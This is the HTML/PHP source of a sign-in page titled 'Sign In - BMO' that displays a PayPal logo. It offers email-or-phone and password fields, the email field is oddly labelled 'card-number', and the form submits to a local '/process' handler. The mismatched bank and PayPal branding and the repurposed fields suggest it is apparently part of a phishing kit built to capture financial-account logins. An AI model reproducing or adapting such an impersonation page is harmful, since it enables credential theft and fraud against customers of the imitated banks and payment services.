<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign In - BMO</title>

  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <link rel="stylesheet" href="/assets/css/styles.css">
  <script src="https://kit.fontawesome.com/64664913ea.js" crossorigin="anonymous"></script>
</head>
<body>

  <!-- <?php
    // include('views/templates/nav.php');
  ?> -->
  <div class="container maxheight-container mt-5">
    <div class="card-container">
      <img class="logo-img" src="/assets/media/paypal_icon.png" width="34" height="40" />
      <form method="POST" class="login-form needs-validation" action="/process" novalidate>
        <div class="form-floating mb-3 card-number-field">
          <input required type="text" class="floatingInput form-control" id="card-number" placeholder="Email or Phone number">
          <label class="text-secondary fw-bold" for="floatingInput">Email or Phone number</label>
        </div>
        <div class="form-floating mb-3 password-field">
          <input required type="password" class="floatingInput form-control" id="password" placeholder="Password">
          <label class="text-secondary fw-bold" for="floatingInput">Password</label>
          <div class="mt-lg-2">
            <a href="#" class="fw-bold text-decoration-none">Forgot Password?</a>
          </div>
        </div>

        <input class="btn btn-next mt-3 py-2 fs-6 rounded-pill" type="submit" value="Next">
      </form>
      <div class="divider">
        <hr/>
        <span>or</span>
      </div>
      <input class="btn btn-sign py-2 fs-6 btn rounded-pill" type="submit" value="Sign Up">
      <div class="flex flex-1 justify-content-center">
        <a href="#" class="language-text">English</a>
        <a href="#" class="language-text text-border-left">Русский</a>
        <a href="#" class="language-text text-border-left">Français</a>
        <a href="#" class="language-text text-border-left">Español</a> 
        <a href="#" class="language-text text-border-left">中文</a> 
      </div> 
    </div>
  </div>

  <?php
    include('views/templates/footer.php');
  ?>

  <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js" 
        integrity="sha256-yE5LLp5HSQ/z+hJeCqkz9hdjNkk1jaiGG0tDCraumnA=" 
        crossorigin="anonymous"></script>

  <script src="/assets/js/main.js"></script>
</body>
</html>